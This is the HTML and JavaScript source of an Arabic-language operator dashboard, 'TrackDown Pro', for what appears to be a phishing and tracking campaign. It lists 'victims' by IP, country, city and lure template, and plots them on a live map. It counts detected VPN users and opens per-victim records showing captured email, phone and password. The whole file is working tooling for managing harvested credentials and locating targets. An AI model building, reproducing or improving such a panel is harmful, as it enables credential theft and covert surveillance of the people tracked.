<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TrackDown Pro - Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
        body {
            font-family: 'Tajawal', sans-serif;
            background: #0a0a1a;
            color: #e0e0e0;
            min-height: 100vh;
            direction: rtl;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0a0a1a; }
        ::-webkit-scrollbar-thumb { background: #6C63FF; border-radius: 4px; }

        .login-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #0a0a1a;
            display: flex; align-items: center; justify-content: center;
            z-index: 10000;
            transition: opacity 0.5s, visibility 0.5s;
        }
        .login-overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .login-box {
            background: #1a1a2e;
            border: 1px solid rgba(108,99,255,0.3);
            border-radius: 16px;
            padding: 48px 40px;
            width: 400px;
            max-width: 90%;
            text-align: center;
            animation: slideUp 0.6s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .login-box .logo { font-size: 48px; margin-bottom: 8px; }
        .login-box h2 { color: #6C63FF; font-size: 28px; margin-bottom: 8px; }
        .login-box p { color: #888; margin-bottom: 32px; font-size: 14px; }
        .login-box input {
            width: 100%; padding: 14px 20px;
            background: #0a0a1a; border: 1px solid rgba(108,99,255,0.3);
            border-radius: 10px; color: #fff; font-size: 16px;
            font-family: 'Tajawal', sans-serif;
            outline: none; transition: border 0.3s;
            text-align: center;
        }
        .login-box input:focus { border-color: #6C63FF; }
        .login-box button {
            width: 100%; padding: 14px; margin-top: 20px;
            background: linear-gradient(135deg, #6C63FF, #5a52d5);
            border: none; border-radius: 10px;
            color: #fff; font-size: 16px; font-weight: 700;
            cursor: pointer; transition: transform 0.2s, box-shadow 0.2s;
            font-family: 'Tajawal', sans-serif;
        }
        .login-box button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(108,99,255,0.4); }
        .login-error { color: #ff4757; margin-top: 12px; font-size: 14px; display: none; }

        .dashboard { display: none; }
        .dashboard.active { display: block; }

        .topbar {
            background: #1a1a2e;
            border-bottom: 1px solid rgba(108,99,255,0.2);
            padding: 16px 32px;
            display: flex; align-items: center; justify-content: space-between;
            position: sticky; top: 0; z-index: 100;
            backdrop-filter: blur(10px);
        }
        .topbar-brand {
            display: flex; align-items: center; gap: 12px;
            font-size: 22px; font-weight: 800; color: #6C63FF;
        }
        .topbar-brand i { font-size: 24px; }
        .topbar-actions { display: flex; align-items: center; gap: 16px; }
        .topbar-actions .search-box {
            position: relative;
        }
        .topbar-actions .search-box input {
            background: #0a0a1a; border: 1px solid rgba(108,99,255,0.2);
            border-radius: 8px; padding: 10px 40px 10px 16px;
            color: #fff; font-size: 14px; width: 280px;
            font-family: 'Tajawal', sans-serif; outline: none;
            transition: border 0.3s, width 0.3s;
        }
        .topbar-actions .search-box input:focus { border-color: #6C63FF; width: 340px; }
        .topbar-actions .search-box i {
            position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
            color: #666;
        }
        .live-indicator {
            display: flex; align-items: center; gap: 8px;
            color: #00d97e; font-size: 13px; font-weight: 500;
        }
        .live-dot {
            width: 8px; height: 8px; background: #00d97e;
            border-radius: 50%; animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,217,126,0.4); }
            50% { opacity: 0.7; box-shadow: 0 0 0 8px rgba(0,217,126,0); }
        }
        .btn-logout {
            background: rgba(255,71,87,0.15); border: 1px solid rgba(255,71,87,0.3);
            color: #ff4757; padding: 8px 20px; border-radius: 8px;
            cursor: pointer; font-size: 13px; font-family: 'Tajawal', sans-serif;
            transition: all 0.3s;
        }
        .btn-logout:hover { background: rgba(255,71,87,0.3); }

        .main-content { padding: 24px 32px; max-width: 1600px; margin: 0 auto; }

        .stats-grid {
            display: grid; grid-template-columns: repeat(4, 1fr);
            gap: 20px; margin-bottom: 28px;
        }
        .stat-card {
            background: #1a1a2e;
            border: 1px solid rgba(108,99,255,0.15);
            border-radius: 14px; padding: 24px;
            display: flex; align-items: center; gap: 20px;
            transition: transform 0.3s, border-color 0.3s, box-shadow 0.3s;
            cursor: default;
        }
        .stat-card:hover {
            transform: translateY(-4px);
            border-color: rgba(108,99,255,0.4);
            box-shadow: 0 8px 30px rgba(108,99,255,0.15);
        }
        .stat-icon {
            width: 56px; height: 56px; border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            font-size: 24px;
        }
        .stat-icon.total { background: rgba(108,99,255,0.15); color: #6C63FF; }
        .stat-icon.today { background: rgba(0,217,126,0.15); color: #00d97e; }
        .stat-icon.active { background: rgba(255,165,2,0.15); color: #ffa502; }
        .stat-icon.vpn { background: rgba(255,71,87,0.15); color: #ff4757; }
        .stat-info h3 { font-size: 28px; font-weight: 800; margin-bottom: 4px; }
        .stat-info p { color: #888; font-size: 13px; }

        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 28px; }
        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin-bottom: 28px; }

        .card {
            background: #1a1a2e;
            border: 1px solid rgba(108,99,255,0.15);
            border-radius: 14px; padding: 24px;
            transition: border-color 0.3s;
        }
        .card:hover { border-color: rgba(108,99,255,0.3); }
        .card-header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 20px;
        }
        .card-header h3 { font-size: 16px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
        .card-header h3 i { color: #6C63FF; }

        #victimMap { height: 400px; border-radius: 10px; z-index: 1; }

        .table-wrapper { overflow-x: auto; }
        table {
            width: 100%; border-collapse: collapse;
            font-size: 14px;
        }
        thead th {
            background: rgba(108,99,255,0.1);
            padding: 14px 16px; text-align: right;
            color: #6C63FF; font-weight: 600;
            border-bottom: 1px solid rgba(108,99,255,0.2);
            white-space: nowrap;
        }
        tbody td {
            padding: 12px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            white-space: nowrap;
        }
        tbody tr { transition: background 0.2s; }
        tbody tr:hover { background: rgba(108,99,255,0.05); }
        .badge {
            padding: 4px 10px; border-radius: 6px;
            font-size: 12px; font-weight: 600;
        }
        .badge-template { background: rgba(108,99,255,0.15); color: #6C63FF; }
        .btn-view {
            background: rgba(108,99,255,0.15); border: 1px solid rgba(108,99,255,0.3);
            color: #6C63FF; padding: 6px 14px; border-radius: 6px;
            cursor: pointer; font-size: 12px; transition: all 0.3s;
            font-family: 'Tajawal', sans-serif;
        }
        .btn-view:hover { background: #6C63FF; color: #fff; }

        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); z-index: 9999;
            display: none; align-items: center; justify-content: center;
            backdrop-filter: blur(4px);
        }
        .modal-overlay.active { display: flex; }
        .modal {
            background: #1a1a2e; border: 1px solid rgba(108,99,255,0.3);
            border-radius: 16px; padding: 32px;
            width: 600px; max-width: 90%; max-height: 80vh;
            overflow-y: auto; animation: slideUp 0.3s ease;
        }
        .modal-header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 24px; padding-bottom: 16px;
            border-bottom: 1px solid rgba(108,99,255,0.2);
        }
        .modal-header h3 { font-size: 20px; color: #6C63FF; }
        .modal-close {
            background: none; border: none; color: #888;
            font-size: 24px; cursor: pointer; transition: color 0.3s;
        }
        .modal-close:hover { color: #ff4757; }
        .detail-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .detail-row .label { color: #888; font-size: 14px; }
        .detail-row .value { color: #fff; font-weight: 600; font-size: 14px; }

        .chart-container { position: relative; height: 280px; }

        @media (max-width: 1200px) {
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .grid-3 { grid-template-columns: 1fr; }
        }
        @media (max-width: 768px) {
            .stats-grid { grid-template-columns: 1fr; }
            .grid-2 { grid-template-columns: 1fr; }
            .main-content { padding: 16px; }
            .topbar { padding: 12px 16px; flex-wrap: wrap; gap: 12px; }
            .topbar-actions .search-box input { width: 200px; }
            .topbar-actions .search-box input:focus { width: 200px; }
        }

        .fade-in { animation: fadeIn 0.5s ease; }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .no-data { text-align: center; padding: 40px; color: #666; }
        .no-data i { font-size: 48px; margin-bottom: 12px; display: block; color: #444; }
    </style>
</head>
<body>

<div class="login-overlay" id="loginOverlay">
    <div class="login-box">
        <div class="logo">🎯</div>
        <h2>TrackDown Pro</h2>
        <p>لوحة التحكم الإدارية</p>
        <input type="password" id="loginPassword" placeholder="كلمة المرور" onkeypress="if(event.key==='Enter')doLogin()">
        <button onclick="doLogin()"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
        <div class="login-error" id="loginError">كلمة المرور غير صحيحة</div>
    </div>
</div>

<div class="dashboard" id="dashboard">
    <div class="topbar">
        <div class="topbar-brand">
            <i class="fas fa-crosshairs"></i>
            TrackDown Pro
        </div>
        <div class="topbar-actions">
            <div class="search-box">
                <i class="fas fa-search"></i>
                <input type="text" id="searchInput" placeholder="بحث عن ضحية..." oninput="searchVictims(this.value)">
            </div>
            <div class="live-indicator">
                <div class="live-dot"></div>
                مباشر
            </div>
            <button class="btn-logout" onclick="doLogout()"><i class="fas fa-sign-out-alt"></i> خروج</button>
        </div>
    </div>

    <div class="main-content">
        <div class="stats-grid fade-in">
            <div class="stat-card">
                <div class="stat-icon total"><i class="fas fa-users"></i></div>
                <div class="stat-info">
                    <h3 id="statTotal">0</h3>
                    <p>إجمالي الضحايا</p>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon today"><i class="fas fa-user-plus"></i></div>
                <div class="stat-info">
                    <h3 id="statToday">0</h3>
                    <p>ضحايا اليوم</p>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon active"><i class="fas fa-signal"></i></div>
                <div class="stat-info">
                    <h3 id="statActive">0</h3>
                    <p>نشط الآن</p>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon vpn"><i class="fas fa-shield-alt"></i></div>
                <div class="stat-info">
                    <h3 id="statVPN">0</h3>
                    <p>VPN مكتشف</p>
                </div>
            </div>
        </div>

        <div class="grid-2 fade-in">
            <div class="card">
                <div class="card-header">
                    <h3><i class="fas fa-map-marked-alt"></i> خريطة الضحايا المباشرة</h3>
                </div>
                <div id="victimMap"></div>
            </div>
            <div class="card">
                <div class="card-header">
                    <h3><i class="fas fa-chart-bar"></i> الضحايا حسب القالب</h3>
                </div>
                <div class="chart-container">
                    <canvas id="templateChart"></canvas>
                </div>
            </div>
        </div>

        <div class="grid-2 fade-in">
            <div class="card">
                <div class="card-header">
                    <h3><i class="fas fa-chart-line"></i> النشاط خلال 24 ساعة</h3>
                </div>
                <div class="chart-container">
                    <canvas id="hourlyChart"></canvas>
                </div>
            </div>
            <div class="card">
                <div class="card-header">
                    <h3><i class="fas fa-chart-pie"></i> توزيع الدول</h3>
                </div>
                <div class="chart-container">
                    <canvas id="countryChart"></canvas>
                </div>
            </div>
        </div>

        <div class="card fade-in" style="margin-bottom: 28px;">
            <div class="card-header">
                <h3><i class="fas fa-list"></i> آخر الضحايا</h3>
            </div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th>IP</th>
                            <th>الدولة</th>
                            <th>المدينة</th>
                            <th>القالب</th>
                            <th>الوقت</th>
                            <th>الإجراءات</th>
                        </tr>
                    </thead>
                    <tbody id="victimsTable">
                        <tr><td colspan="6" class="no-data"><i class="fas fa-spinner fa-spin"></i>جاري التحميل...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this)closeModal()">
    <div class="modal">
        <div class="modal-header">
            <h3><i class="fas fa-user-secret"></i> تفاصيل الضحية</h3>
            <button class="modal-close" onclick="closeModal()">&times;</button>
        </div>
        <div id="modalContent"></div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
const BASE = '';
let map, markersGroup;
let templateChart, hourlyChart, countryChart;
let updateInterval;

let dashToken = '';
async function doLogin() {
    const pw = document.getElementById('loginPassword').value;
    try {
        const r = await fetch(BASE + '/api/panel/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});
        const d = await r.json();
        if (d.success) {
            dashToken = d.token;
            document.getElementById('loginOverlay').classList.add('hidden');
            document.getElementById('dashboard').classList.add('active');
            initDashboard();
        } else {
            const err = document.getElementById('loginError');
            err.style.display = 'block';
            setTimeout(() => err.style.display = 'none', 3000);
        }
    } catch(e) {
        const err = document.getElementById('loginError');
        err.style.display = 'block';
        setTimeout(() => err.style.display = 'none', 3000);
    }
}

function doLogout() {
    clearInterval(updateInterval);
    dashToken = '';
    document.getElementById('loginOverlay').classList.remove('hidden');
    document.getElementById('dashboard').classList.remove('active');
    document.getElementById('loginPassword').value = '';
}

function initDashboard() {
    initMap();
    loadStats();
    loadMapData();
    loadTemplateChart();
    loadHourlyChart();
    loadCountryChart();
    loadRecentVictims();
    updateInterval = setInterval(() => {
        loadStats();
        loadMapData();
        loadRecentVictims();
    }, 30000);
}

function initMap() {
    if (map) return;
    map = L.map('victimMap').setView([25, 45], 3);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        attribution: '&copy; CartoDB',
        maxZoom: 19
    }).addTo(map);
    markersGroup = L.layerGroup().addTo(map);
    setTimeout(() => map.invalidateSize(), 300);
}

async function apiFetch(endpoint) {
    try {
        const res = await fetch(BASE + endpoint, {headers:{'X-Dashboard-Token': dashToken}});
        if (!res.ok) { if(res.status===401) doLogout(); return null; }
        return await res.json();
    } catch(e) { return null; }
}

async function loadStats() {
    const data = await apiFetch('/api/panel/stats');
    if (!data) return;
    animateNumber('statTotal', data.total || 0);
    animateNumber('statToday', data.today || 0);
    animateNumber('statActive', data.active || 0);
    animateNumber('statVPN', data.vpn || 0);
}

function animateNumber(id, target) {
    const el = document.getElementById(id);
    const current = parseInt(el.textContent) || 0;
    if (current === target) return;
    const diff = target - current;
    const steps = 20;
    const inc = diff / steps;
    let step = 0;
    const timer = setInterval(() => {
        step++;
        if (step >= steps) {
            el.textContent = target;
            clearInterval(timer);
        } else {
            el.textContent = Math.round(current + inc * step);
        }
    }, 30);
}

async function loadMapData() {
    const data = await apiFetch('/api/panel/map');
    if (!data || !markersGroup) return;
    markersGroup.clearLayers();
    data.forEach(v => {
        if (v.lat && v.lon) {
            const marker = L.circleMarker([v.lat, v.lon], {
                radius: 7, fillColor: '#6C63FF', color: '#fff',
                weight: 1, fillOpacity: 0.9
            });
            marker.bindPopup(`
                <div style="direction:rtl;font-family:Tajawal,sans-serif;min-width:150px">
                    <b>${v.ip || 'N/A'}</b><br>
                    🌍 ${v.country || ''} - ${v.city || ''}<br>
                    📄 ${v.template || ''}<br>
                    🕐 ${v.time || ''}
                </div>
            `);
            markersGroup.addLayer(marker);
        }
    });
}

const chartColors = ['#6C63FF','#00d97e','#ffa502','#ff4757','#1e90ff','#ff6348','#7bed9f','#70a1ff','#eccc68','#a29bfe','#fd79a8','#55efc4'];

async function loadTemplateChart() {
    const data = await apiFetch('/api/panel/template-stats');
    if (!data) return;
    const labels = data.map(d => d.name || 'غير محدد');
    const values = data.map(d => d.count || 0);
    const ctx = document.getElementById('templateChart').getContext('2d');
    if (templateChart) templateChart.destroy();
    templateChart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels,
            datasets: [{
                label: 'عدد الضحايا',
                data: values,
                backgroundColor: chartColors.slice(0, labels.length),
                borderRadius: 6, borderSkipped: false
            }]
        },
        options: {
            responsive: true, maintainAspectRatio: false,
            plugins: { legend: { display: false } },
            scales: {
                x: { ticks: { color: '#888' }, grid: { display: false } },
                y: { ticks: { color: '#888' }, grid: { color: 'rgba(255,255,255,0.05)' } }
            }
        }
    });
}

async function loadHourlyChart() {
    const data = await apiFetch('/api/panel/hourly-stats');
    if (!data) return;
    const labels = data.map(d => d.hour + ':00');
    const values = data.map(d => d.count || 0);
    const ctx = document.getElementById('hourlyChart').getContext('2d');
    if (hourlyChart) hourlyChart.destroy();
    hourlyChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels,
            datasets: [{
                label: 'النشاط',
                data: values,
                borderColor: '#6C63FF',
                backgroundColor: 'rgba(108,99,255,0.1)',
                fill: true, tension: 0.4,
                pointBackgroundColor: '#6C63FF',
                pointRadius: 3, pointHoverRadius: 6
            }]
        },
        options: {
            responsive: true, maintainAspectRatio: false,
            plugins: { legend: { display: false } },
            scales: {
                x: { ticks: { color: '#888' }, grid: { display: false } },
                y: { ticks: { color: '#888' }, grid: { color: 'rgba(255,255,255,0.05)' }, beginAtZero: true }
            }
        }
    });
}

async function loadCountryChart() {
    const data = await apiFetch('/api/panel/victims');
    if (!data) return;
    const countries = {};
    data.forEach(v => {
        const c = v.country || 'غير معروف';
        countries[c] = (countries[c] || 0) + 1;
    });
    const sorted = Object.entries(countries).sort((a,b) => b[1]-a[1]).slice(0, 10);
    const labels = sorted.map(s => s[0]);
    const values = sorted.map(s => s[1]);
    const ctx = document.getElementById('countryChart').getContext('2d');
    if (countryChart) countryChart.destroy();
    countryChart = new Chart(ctx, {
        type: 'pie',
        data: {
            labels,
            datasets: [{
                data: values,
                backgroundColor: chartColors.slice(0, labels.length),
                borderWidth: 0
            }]
        },
        options: {
            responsive: true, maintainAspectRatio: false,
            plugins: {
                legend: {
                    position: 'right',
                    labels: { color: '#ccc', padding: 12, font: { size: 12 } }
                }
            }
        }
    });
}

async function loadRecentVictims() {
    const data = await apiFetch('/api/panel/recent');
    if (!data) return;
    renderVictimsTable(data);
}

function renderVictimsTable(data) {
    const tbody = document.getElementById('victimsTable');
    if (!data || data.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" class="no-data"><i class="fas fa-inbox"></i>لا توجد بيانات</td></tr>';
        return;
    }
    tbody.innerHTML = data.map(v => `
        <tr>
            <td><code style="color:#6C63FF">${v.ip || 'N/A'}</code></td>
            <td>${v.country || '-'}</td>
            <td>${v.city || '-'}</td>
            <td><span class="badge badge-template">${v.template || '-'}</span></td>
            <td>${v.time || '-'}</td>
            <td><button class="btn-view" onclick='showDetail(${JSON.stringify(v).replace(/'/g,"&#39;")})'><i class="fas fa-eye"></i> عرض</button></td>
        </tr>
    `).join('');
}

async function searchVictims(query) {
    if (!query || query.length < 2) {
        loadRecentVictims();
        return;
    }
    const data = await apiFetch('/api/panel/search?q=' + encodeURIComponent(query));
    if (data) renderVictimsTable(data);
}

function showDetail(victim) {
    const content = document.getElementById('modalContent');
    const fields = [
        ['IP', victim.ip],
        ['الدولة', victim.country],
        ['المدينة', victim.city],
        ['القالب', victim.template],
        ['الوقت', victim.time],
        ['المتصفح', victim.useragent || victim.browser],
        ['النظام', victim.os || victim.platform],
        ['اللغة', victim.language || victim.lang],
        ['الشاشة', victim.screen],
        ['VPN', victim.vpn ? 'نعم' : 'لا'],
        ['خط العرض', victim.lat],
        ['خط الطول', victim.lon],
        ['المُعرّف', victim.uid],
        ['البريد', victim.email],
        ['الهاتف', victim.phone],
        ['كلمة المرور', victim.password],
    ];
    content.innerHTML = fields
        .filter(f => f[1] !== undefined && f[1] !== null && f[1] !== '')
        .map(f => `<div class="detail-row"><span class="label">${f[0]}</span><span class="value">${f[1]}</span></div>`)
        .join('');
    document.getElementById('modalOverlay').classList.add('active');
}

function closeModal() {
    document.getElementById('modalOverlay').classList.remove('active');
}

document.addEventListener('keydown', e => {
    if (e.key === 'Escape') closeModal();
});
</script>
</body>
</html>
